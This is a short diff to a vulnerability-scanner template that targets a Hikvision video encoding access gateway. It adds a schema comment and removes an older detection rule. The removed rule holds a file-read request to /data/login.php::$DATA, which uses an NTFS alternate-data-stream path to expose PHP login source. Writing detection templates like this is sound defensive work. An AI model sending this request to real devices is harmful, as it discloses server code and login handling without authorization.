@@ -1,3 +1,4 @@
+# yaml-language-server: $schema=https://raw.githubusercontent.com/projectdiscovery/nuclei/dev/pkg/templates/nuclei-jsonschema.json
 id: hikvision-gateway-data-file-read
 
 info:
@@ -9,11 +10,3 @@ info:
     title="视频编码设备接入网关"
   reference:
     - http://wiki.peiqi.tech/wiki/iot/HIKVISION/HIKVISION%20%E8%A7%86%E9%A2%91%E7%BC%96%E7%A0%81%E8%AE%BE%E5%A4%87%E6%8E%A5%E5%85%A5%E7%BD%91%E5%85%B3%20$DATA%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96.html
-
-rules:
-  r0:
-    request:
-      method: GET
-      path: /data/login.php::$DATA
-    expression: response.status == 200 && response.body.bcontains(b'DataBaseQuery();') && response.body.bcontains(b'$_POST[\'userName\'];') && response.body.bcontains(b'$_POST[\'password\'];')
-expression: r0()
